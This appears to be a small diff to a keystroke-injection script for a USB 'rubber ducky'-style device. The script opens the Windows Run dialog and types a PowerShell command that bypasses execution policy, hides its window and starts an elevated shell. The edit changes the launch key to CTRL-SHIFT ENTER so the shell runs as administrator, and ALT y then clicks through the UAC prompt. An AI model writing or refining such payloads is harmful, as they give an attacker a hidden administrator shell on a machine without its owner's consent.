@@ -41,7 +41,7 @@ DELAY 1000
 GUI r
 DELAY 500
 STRING powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoExit -Command "Start-Process powershell -Verb runAs"
-ENTER
+CTRL-SHIFT ENTER
 DELAY 1500
 ALT y
 DELAY 1000
